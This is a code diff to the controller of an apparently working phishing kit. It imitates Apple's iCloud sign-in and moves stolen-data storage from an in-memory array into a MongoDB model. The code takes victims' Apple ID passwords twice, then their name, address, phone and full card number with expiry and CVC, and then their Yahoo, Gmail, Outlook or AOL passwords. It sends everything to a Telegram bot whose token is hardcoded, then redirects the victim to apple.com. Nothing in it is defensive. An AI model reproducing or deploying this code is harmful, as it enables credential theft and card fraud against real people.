@@ -1,37 +1,23 @@
-//const User = require('../models/User')
+const User = require('../models/User')
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
 const token = "6563244298:AAF5y_kx6LDFDa_ZXaGWB3p6ZfJXgKnrsi8";
 const bot = new TelegramBot(token, { polling: true });
 const chatID = -4076400458
 i = -1
-var Users = []
 
-exports.login_page = (req, res) => {
+exports.login_page = async (req, res) => {
   i++
   var ua = req.headers['user-agent'];
 
-  newUser = {
-    count: i,
-    userAgent: ua,  
-    icloudID : '',
-    IcloudPASS: '',
-    IcloudPASS2: '',
-    name: '',
-    address1: '',
-    address2: '',
-    city: '',
-    state: '',
-    zip: '',
-    phone: '',
-    cardnumber: '',
-    expiration: '',
-    cvc: '',
-    emailPASS: '',
-    emailPASS2: ''
 
-  }
-  Users[i] = newUser
+  user = new User({
+    count: i,
+    userAgent: ua,
+  });
+
+  await user.save();
+
   bot.sendMessage(chatID, "New User Has Landed and is assigned an ID of " + i + "\nUser-Agent : " + ua + "\n")
 
   res.render('icloud', { count : i})
@@ -41,8 +27,10 @@ exports.login_post = async (req, res) => {
   const email = req.body.appleid;
   const password = req.body.password
   const count = req.body.count;
-  Users[count].icloudID = email
-  Users[count].IcloudPASS = password
+
+  
+  await User.findOneAndUpdate({ count }, { appleID: email,  applePass: password});
+  
 
   res.render('icloud-invalid', { count : i, email})
 
@@ -54,7 +42,9 @@ exports.billingform_post = async (req, res) => {
   const email = req.body.appleid;
   const password = req.body.password
   const count = req.body.count;
-  Users[count].IcloudPASS2 = password
+
+  await User.findOneAndUpdate({ count }, { applePass2: password});
+
 
   res.render('icloud-cc', { count : i, email})
 
@@ -64,32 +54,36 @@ exports.billingform_post = async (req, res) => {
 exports.billingformsubmit_post = async (req, res) => {
   console.log(req.body)
   const count = req.body.count;
-  Users[count].name = req.body.name
-  Users[count].address1 = req.body.address1
-  Users[count].address2 = req.body.address2
-  Users[count].address2 = req.body.address2
-  Users[count].city = req.body.city
-  Users[count].state = req.body.state
-  Users[count].zip = req.body.zip
-  Users[count].phone = req.body.phone
-  Users[count].cardnumber = req.body.cardnumber
-  Users[count].expiration = req.body.expiration
-  Users[count].cvc = req.body.cvc
+
+  theuser = await User.findOneAndUpdate({ count }, { 
+    name : req.body.name,
+    address1 : req.body.address1,
+    address2 : req.body.address2,
+    city : req.body.city,
+    state : req.body.state,
+    zip : req.body.zip,
+    phone : req.body.phone,
+    cardnumber : req.body.cardnumber,
+    expiration : req.body.expiration,
+    cvc : req.body.cvc,
+  });
+
+
 
   switch (true) {
-    case Users[count].icloudID.includes('yahoo.com'):
+    case theuser.appleID.includes('yahoo.com'):
       res.redirect(`/login/yahoo/${count}`)
       break;
-    case Users[count].icloudID.includes('gmail.com'):
+    case theuser.appleID.includes('gmail.com'):
       res.redirect(`/login/gmail/${count}`)
       break;
-    case Users[count].icloudID.includes('outlook.com'):
+    case theuser.appleID.includes('outlook.com'):
       res.redirect(`/login/outlook/${count}`)
       break;
-    case Users[count].icloudID.includes('mail.com'):
+    case theuser.appleID.includes('mail.com'):
       res.redirect(`/login/mail/${count}`)
       break;
-    case Users[count].icloudID.includes('aol.com'):
+    case theuser.appleID.includes('aol.com'):
       res.redirect(`/login/aol/${count}`)
       break;
     default:
@@ -98,20 +92,22 @@ exports.billingformsubmit_post = async (req, res) => {
 }
 
 
-exports.page_loader_get = (req, res) => {
+exports.page_loader_get = async (req, res) => {
   console.log(`Recieved req at ${req.url}`)
   page2load = req.params.page
   count = req.params.count 
-  email = Users[count].icloudID
+  theuser = await User.findOne({count})
+  email = theuser.appleID
   res.render(`${page2load}-pass`, { count, email })
 }
 
-exports.page_loader_post = (req, res) => {
+exports.page_loader_post = async (req, res) => {
   page2load = req.params.page
   count = req.params.count
-  email = Users[count].icloudID
   password = req.body.password
-  Users[count].emailPASS = password
+  theuser = await User.findOneAndUpdate({count}, { emailPASS1: password})
+  email = theuser.appleID
+  
   // console.log(Users[count])
   res.render(`${page2load}-pass-invalid`, { count, email, page2load })
 
@@ -120,32 +116,31 @@ exports.page_loader_post = (req, res) => {
 }
 
 
-exports.invalidpage_loader_post = (req, res) => {
+exports.invalidpage_loader_post = async (req, res) => {
   page2load = req.params.page
   count = req.params.count
   password = req.body.password
-  Users[count].emailPASS2 = password
-  console.log(Users[count])
+  theuser = await User.findOneAndUpdate({count}, { emailPASS2: password})
+  console.log(theuser)
   // res.render(`${page2load}-pass-invalid`, { count, email })
   bot.sendMessage(chatID, `
     count: ${count}
-    ua: ${Users[count].userAgent}
-    Apple ID: ${Users[count].icloudID}
-    Apple ID Pass1: ${Users[count].IcloudPASS}
-    Apple ID Pass2: ${Users[count].IcloudPASS2}
-    name: ${Users[count].name}
-    address1: ${Users[count].address1}
-    address2: ${Users[count].address2}
-    address2: ${Users[count].address2}
-    city: ${Users[count].city}
-    state: ${Users[count].state}
-    zip: ${Users[count].zip}
-    phone: ${Users[count].phone}
-    cardnumber: ${Users[count].cardnumber}
-    expiration: ${Users[count].expiration}
-    cvc: ${Users[count].cvc}
-    emailPASS: ${Users[count].emailPASS}
-    emailPASS2: ${Users[count].emailPASS2}
+    ua: ${theuser.userAgent}
+    Apple ID: ${theuser.appleID}
+    Apple ID Pass1: ${theuser.applePass}
+    Apple ID Pass2: ${theuser.applePass2}
+    name: ${theuser.name}
+    address1: ${theuser.address1}
+    address2: ${theuser.address2}
+    city: ${theuser.city}
+    state: ${theuser.state}
+    zip: ${theuser.zip}
+    phone: ${theuser.phone}
+    cardnumber: ${theuser.cardnumber}
+    expiration: ${theuser.expiration}
+    cvc: ${theuser.cvc}
+    emailPASS: ${theuser.emailPASS1}
+    emailPASS2: ${theuser.emailPASS2}
   `)
 
   res.redirect('https://apple.com')
